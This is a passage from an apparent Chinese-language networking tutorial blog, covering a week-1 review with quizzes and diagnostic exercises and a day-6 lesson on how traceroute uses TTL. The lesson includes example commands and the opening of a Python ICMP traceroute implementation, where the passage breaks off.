Linux/Mac</span><br>tracert baidu.com     <span class="hljs-comment"># Windows</span><br></code></pre></td></tr></table></figure><p><strong>Wireshark</strong>：</p><ul><li>图形化抓包工具</li><li>支持多种协议分析</li><li>强大的过滤功能</li></ul><h2 id="🧪-综合练习题">🧪 综合练习题</h2><h3 id="一、选择题">一、选择题</h3><ol><li><p>以下哪个不是网络拓扑结构？<br>A. 星型  B. 环型  C. 圆型  D. 总线型</p></li><li><p>TCP/IP模型有几层？<br>A. 4层  B. 5层  C. 7层  D. 9层</p></li><li><p>ping命令使用的是哪个协议？<br>A. TCP  B. UDP  C. ICMP  D. HTTP</p></li><li><p>以下哪个IP地址是私网地址？<br>A. 8.8.8.8  B. 192.168.1.1  C. 114.114.114.114  D. 220.181.38.148</p></li><li><p>HTTP协议默认使用哪个端口？<br>A. 22  B. 80  C. 443  D. 3306</p></li></ol><h3 id="二、简答题">二、简答题</h3><ol><li><p>解释OSI模型中每一层的主要作用。</p></li><li><p>TCP和UDP有什么区别？各自适用于什么场景？</p></li><li><p>说明ping命令的工作原理。</p></li><li><p>什么是子网掩码？192.168.1.0/24是什么意思？</p></li><li><p>数据包从应用层到物理层的封装过程是怎样的？</p></li></ol><h3 id="三、实践题">三、实践题</h3><ol><li><p><strong>网络诊断</strong></p><ul><li>使用ping测试到baidu.com的连通性</li><li>记录RTT和TTL值</li><li>分析结果说明什么</li></ul></li><li><p><strong>路径追踪</strong></p><ul><li>使用traceroute追踪到google.com的路径</li><li>记录经过的跳数</li><li>哪一跳延迟最大？为什么？</li></ul></li><li><p><strong>抓包分析</strong></p><ul><li>使用Wireshark抓取访问<a href="http://www.example.xn--com-n82e636edycn86b">http://www.example.com的数据包</a></li><li>找出DNS查询包</li><li>找出TCP三次握手的包</li><li>找出HTTP GET请求包</li><li>分析每个包的各层结构</li></ul></li><li><p><strong>局域网扫描</strong></p><ul><li>扫描你所在的局域网</li><li>列出所有在线设备的IP和MAC地址</li><li>绘制简单的网络拓扑图</li></ul></li></ol><h2 id="🚀-综合实战项目">🚀 综合实战项目</h2><h3 id="项目：网络诊断工具箱">项目：网络诊断工具箱</h3><p><strong>需求</strong>：<br>开发一个综合的网络诊断工具，整合本周学到的所有知识。</p><p><strong>功能</strong>：</p><ol><li><strong>连通性测试</strong>：ping功能</li><li><strong>路由追踪</strong>：traceroute功能</li><li><strong>端口扫描</strong>：扫描指定主机的开放端口</li><li><strong>局域网扫描</strong>：发现局域网内的所有设备</li><li><strong>DNS查询</strong>：查询域名的IP地址</li><li><strong>网络信息</strong>：显示本机网络配置</li></ol><p><strong>实现提示</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day08_network_toolbox.py</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkToolbox</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>(<span class="hljs-params">self, host</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;测试连通性&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>(<span class="hljs-params">self, host</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;追踪路由&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_ports</span>(<span class="hljs-params">self, host, ports</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_lan</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;扫描局域网&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dns_lookup</span>(<span class="hljs-params">self, domain</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;DNS查询&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_network_info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;获取本机网络信息&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    toolbox = NetworkToolbox()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== 网络诊断工具箱 ===&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. Ping测试&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 路由追踪&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 端口扫描&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. 局域网扫描&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;5. DNS查询&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;6. 网络信息&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. 退出&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请选择功能: &quot;</span>)<br>        <span class="hljs-comment"># 根据choice调用相应功能</span><br>        ...<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><strong>评分标准</strong>：</p><ul><li>功能完整性：40分</li><li>代码质量：30分</li><li>用户体验：20分</li><li>创新性：10分</li></ul><h2 id="📊-自我评估">📊 自我评估</h2><h3 id="检查清单">检查清单</h3><p>完成本周学习后，你应该能够：</p><ul><li>[ ] 解释什么是计算机网络</li><li>[ ] 说出网络的三种分类</li><li>[ ] 画出五种网络拓扑结构</li><li>[ ] 列出OSI七层模型的每一层</li><li>[ ] 说明TCP/IP四层模型</li><li>[ ] 理解数据包的封装过程</li><li>[ ] 使用ping命令测试网络</li><li>[ ] 使用traceroute追踪路由</li><li>[ ] 使用Wireshark抓包</li><li>[ ] 编写简单的网络诊断程序</li></ul><h3 id="掌握程度评估">掌握程度评估</h3><p>为每个知识点打分（1-5分）：</p><table><thead><tr><th>知识点</th><th>掌握程度</th></tr></thead><tbody><tr><td>网络基础概念</td><td>□□□□□</td></tr><tr><td>网络分类和拓扑</td><td>□□□□□</td></tr><tr><td>OSI七层模型</td><td>□□□□□</td></tr><tr><td>TCP/IP四层模型</td><td>□□□□□</td></tr><tr><td>常用协议理解</td><td>□□□□□</td></tr><tr><td>ping命令使用</td><td>□□□□□</td></tr><tr><td>traceroute使用</td><td>□□□□□</td></tr><tr><td>Wireshark使用</td><td>□□□□□</td></tr><tr><td>网络编程基础</td><td>□□□□□</td></tr></tbody></table><p>如果某项低于3分，建议复习对应章节。</p><h2 id="💡-学习心得">💡 学习心得</h2><p><strong>思考题</strong>：</p><ol><li>本周学习中，哪个知识点你觉得最难理解？</li><li>哪个实战项目你觉得最有趣？</li><li>你遇到了什么困难？如何解决的？</li><li>对下周的学习有什么期待？</li></ol><p><strong>建议</strong>：</p><ul><li>写下你的学习心得</li><li>记录遇到的问题和解决方法</li><li>整理笔记，建立知识体系</li><li>多动手实践，光看不练假把式</li></ul><h2 id="🎯-下周预告">🎯 下周预告</h2><p><strong>第二周：深入理解网络模型</strong></p><p>我们将学习：</p><ul><li>第8天：IP地址详解</li><li>第9天：子网划分实战</li><li>第10天：MAC地址和ARP协议</li><li>第11天：端口和Socket深入</li><li>第12天：DNS协议详解</li><li>第13天：DHCP协议</li><li>第14天：第二周总结和项目</li></ul><p><strong>预习建议</strong>：</p><ul><li>复习本周的IP地址概念</li><li>了解二进制和十进制转换</li><li>思考：为什么需要子网划分？</li></ul><h2 id="🏆-成就解锁">🏆 成就解锁</h2><p>恭喜你完成第一周的学习！你已经解锁：</p><p>✅ <strong>网络入门者</strong>：完成第一周所有内容<br>✅ <strong>抓包新手</strong>：学会使用Wireshark<br>✅ <strong>诊断助手</strong>：会使用ping和traceroute<br>✅ <strong>代码实践者</strong>：编写了5个网络工具</p><p><strong>继续加油，向着网络大师的目标前进！</strong> 💪</p><hr><h2 id="📚-参考资料">📚 参考资料</h2><h3 id="推荐书籍">推荐书籍</h3><ul><li>《计算机网络：自顶向下方法》</li><li>《图解TCP/IP》</li><li>《网络是怎样连接的》</li></ul><h3 id="在线资源">在线资源</h3><ul><li>Wireshark官方文档：<a href="https://www.wireshark.org/docs/">https://www.wireshark.org/docs/</a></li><li>RFC文档库：<a href="https://www.rfc-editor.org/">https://www.rfc-editor.org/</a></li><li>TCP/IP指南：各大技术博客</li></ul><h3 id="练习网站">练习网站</h3><ul><li>HackerRank网络题目</li><li>LeetCode网络相关题</li><li>实验楼网络课程</li></ul><hr><p>💡 <strong>本周金句</strong>：千里之行始于足下，网络学习贵在坚持！</p><p>👉 <a href="day01.md">返回第1天</a> | <a href="../../README.md">返回目录</a> | <a href="../week02/day08.md">进入第2周</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6天：网络命令进阶 - traceroute</title>
    <link href="/2025/11/10/6%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%BF%9B%E9%98%B6%20-%20traceroute/"/>
    <url>/2025/11/10/6%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%BF%9B%E9%98%B6%20-%20traceroute/</url>
    
    <content type="html"><![CDATA[<h1>第6天：网络命令进阶 - traceroute</h1><blockquote><p>“看看数据包是怎样环游世界的。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解traceroute的工作原理</li><li>掌握如何追踪网络路径</li><li>深入理解TTL的作用机制</li><li>编写自己的traceroute工具</li></ul><h2 id="🎯-什么是traceroute？">🎯 什么是traceroute？</h2><h3 id="生活中的例子">生活中的例子</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">traceroute</span> <span class="hljs-operator">=</span> 追踪快递路线<br><br>你的包裹从北京到上海：<br>北京 → 石家庄中转站 → 济南中转站 → 南京中转站 → 上海<br><br>traceroute就是显示数据包经过的所有<span class="hljs-string">&quot;中转站&quot;</span>（路由器）<br></code></pre></td></tr></table></figure><p><strong>traceroute</strong>（Windows上叫tracert）是用来显示数据包从源到目的地所经过的路由路径的工具。</p><h3 id="traceroute的作用">traceroute的作用</h3><ol><li><strong>诊断网络故障</strong>：找出哪个路由器出问题了</li><li><strong>分析网络路径</strong>：了解数据包的传输路线</li><li><strong>测量延迟</strong>：看每一跳的延迟</li><li><strong>发现网络瓶颈</strong>：找出哪里最慢</li></ol><h2 id="🔍-traceroute的工作原理">🔍 traceroute的工作原理</h2><h3 id="核心思想：利用TTL">核心思想：利用TTL</h3><p>还记得昨天学的TTL吗？</p><ul><li>每个数据包都有TTL（Time To Live）</li><li>每经过一个路由器，TTL减1</li><li>当TTL=0时，路由器丢弃数据包，并返回&quot;超时&quot;错误（ICMP Time Exceeded）</li></ul><p><strong>traceroute的巧妙之处</strong>：故意设置小的TTL值！</p><h3 id="完整流程">完整流程</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">第1步：发送<span class="hljs-attribute">TTL</span>=1的包<br>┌──────┐  <span class="hljs-attribute">TTL</span>=1   ┌────────┐<br>│ 你的 │ ───────&gt; │ 路由器1 │<br>│ 电脑 │          └────────┘<br>└──────┘          TTL变成0！<br>                  返回<span class="hljs-string">&quot;超时&quot;</span>消息<br>                  (ICMP Time Exceeded)<br><br>→ 得知第1跳是路由器1<br><br>第2步：发送<span class="hljs-attribute">TTL</span>=2的包<br>┌──────┐  <span class="hljs-attribute">TTL</span>=2   ┌────────┐  <span class="hljs-attribute">TTL</span>=1   ┌────────┐<br>│ 你的 │ ───────&gt; │ 路由器1 │ ───────&gt; │ 路由器2 │<br>│ 电脑 │          └────────┘          └────────┘<br>└──────┘                              TTL变成0！<br>                                      返回<span class="hljs-string">&quot;超时&quot;</span>消息<br><br>→ 得知第2跳是路由器2<br><br>第3步：发送<span class="hljs-attribute">TTL</span>=3的包<br>（依此类推，直到到达目的地）<br></code></pre></td></tr></table></figure><h3 id="图解示意">图解示意</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs 1c">你的电脑 <span class="hljs-punctuation">(</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=1</span><br>    v<br>路由器<span class="hljs-number">1</span> <span class="hljs-punctuation">(</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><span class="hljs-punctuation">)</span>     → 返回<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=2</span><br>    v<br>路由器<span class="hljs-number">2</span> <span class="hljs-punctuation">(</span><span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span><span class="hljs-punctuation">)</span>        → 返回<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=3</span><br>    v<br>路由器<span class="hljs-number">3</span> <span class="hljs-punctuation">(</span><span class="hljs-number">61.135</span>.<span class="hljs-number">169.1</span><span class="hljs-punctuation">)</span>    → 返回<span class="hljs-punctuation">:</span> Time Exceeded<br>    <span class="hljs-string">|</span><br>    <span class="hljs-string">| TTL=4</span><br>    v<br>目标服务器 <span class="hljs-punctuation">(</span><span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><span class="hljs-punctuation">)</span> → 返回<span class="hljs-punctuation">:</span> Echo Reply<br></code></pre></td></tr></table></figure><h2 id="🔧-使用traceroute命令">🔧 使用traceroute命令</h2><h3 id="基本用法">基本用法</h3><p><strong>Linux/Mac</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本traceroute</span><br>traceroute baidu.com<br><br><span class="hljs-comment"># 限制最大跳数</span><br>traceroute -m 20 baidu.com<br><br><span class="hljs-comment"># 不解析域名（更快）</span><br>traceroute -n baidu.com<br><br><span class="hljs-comment"># 使用ICMP而不是UDP</span><br>traceroute -I baidu.com<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本tracert</span><br>tracert baidu.com<br><br><span class="hljs-comment"># 限制最大跳数</span><br>tracert -h 20 baidu.com<br><br><span class="hljs-comment"># 不解析域名</span><br>tracert -d baidu.com<br></code></pre></td></tr></table></figure><h3 id="输出解析">输出解析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ traceroute baidu.com<br><br>traceroute to baidu.com (220.181.38.148), 30 hops max, 60 byte packets<br> 1  192.168.1.1 (192.168.1.1)          1.234 ms  1.123 ms  1.089 ms<br> 2  10.0.0.1 (10.0.0.1)                5.678 ms  5.432 ms  5.345 ms<br> 3  61.135.169.1 (61.135.169.1)        12.345 ms 12.234 ms 12.123 ms<br> 4  61.135.169.125 (61.135.169.125)    15.678 ms 15.567 ms 15.456 ms<br> 5  * * *<br> 6  220.181.38.148 (220.181.38.148)    28.901 ms 28.789 ms 28.678 ms<br></code></pre></td></tr></table></figure><p><strong>字段含义</strong>：</p><ul><li>第1列：跳数（hop number）</li><li>第2列：路由器的IP地址和主机名</li><li>后3列：三次测试的RTT（往返时间）</li><li><code>* * *</code>：该路由器没有回应（可能禁用了ICMP）</li></ul><h2 id="🔧-实战项目：实现简易traceroute工具">🔧 实战项目：实现简易traceroute工具</h2><p>让我们用Python实现traceroute！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day06_simple_traceroute.py</span><br><span class="hljs-comment"># 功能：实现简单的traceroute工具</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_checksum</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    计算ICMP校验和（与ping工具中的相同）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        data += <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br>    checksum = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        word = (data[i] &lt;&lt; <span class="hljs-number">8</span>) + data[i + <span class="hljs-number">1</span>]<br>        checksum += word<br><br>    <span class="hljs-keyword">while</span> checksum &gt;&gt; <span class="hljs-number">16</span>:<br>        checksum = (checksum &amp; <span class="hljs-number">0xFFFF</span>) + (checksum &gt;&gt; <span class="hljs-number">16</span>)<br><br>    checksum = ~checksum &amp; <span class="hljs-number">0xFFFF</span><br>    <span class="hljs-keyword">return</span> checksum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_icmp_packet</span>(<span class="hljs-params">packet_id, sequence</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    创建ICMP Echo Request数据包</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    icmp_type = <span class="hljs-number">8</span>  <span class="hljs-comment"># Echo Request</span><br>    icmp_code = <span class="hljs-number">0</span><br>    icmp_checksum = <span class="hljs-number">0</span><br><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br>    data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br>    icmp_checksum = calculate_checksum(header + data)<br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-keyword">return</span> header + data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_icmp_reply</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析ICMP回复</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        (icmp_type, source_ip)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 解析IP头部，获取源IP</span><br>    ip_header = packet[:<span class="hljs-number">20</span>]<br>    iph = struct.unpack(<span class="hljs-string">&#x27;!BBHHHBBH4s4s&#x27;</span>, ip_header)<br>    source_ip = socket.inet_ntoa(iph[<span class="hljs-number">8</span>])<br><br>    <span class="hljs-comment"># 解析ICMP头部</span><br>    icmp_header = packet[<span class="hljs-number">20</span>:<span class="hljs-number">28</span>]<br>    icmp_type, icmp_code = struct.unpack(<span class="hljs-string">&#x27;!BB&#x27;</span>, icmp_header[:<span class="hljs-number">2</span>])<br><br>    <span class="hljs-keyword">return</span> icmp_type, source_ip<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>(<span class="hljs-params">host, max_hops=<span class="hljs-number">30</span>, timeout=<span class="hljs-number">2</span>, tries=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    追踪到目标主机的路由路径</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        host: 目标主机名或IP</span><br><span class="hljs-string">        max_hops: 最大跳数</span><br><span class="hljs-string">        timeout: 超时时间（秒）</span><br><span class="hljs-string">        tries: 每一跳尝试次数</span><br><span class="hljs-string"></span><br><span class="hljs-string">    工作原理：</span><br><span class="hljs-string">        1. 从TTL=1开始，逐步增加TTL</span><br><span class="hljs-string">        2. 发送ICMP Echo Request</span><br><span class="hljs-string">        3. 收到Time Exceeded回复时，记录该路由器</span><br><span class="hljs-string">        4. 收到Echo Reply时，说明到达目的地</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;traceroute to <span class="hljs-subst">&#123;host&#125;</span>, <span class="hljs-subst">&#123;max_hops&#125;</span> hops max&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 解析目标主机</span><br>    <span class="hljs-keyword">try</span>:<br>        dest_ip = socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目标IP: <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 无法解析主机名: <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 创建原始socket（需要root权限）</span><br>    <span class="hljs-keyword">try</span>:<br>        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        recv_sock = 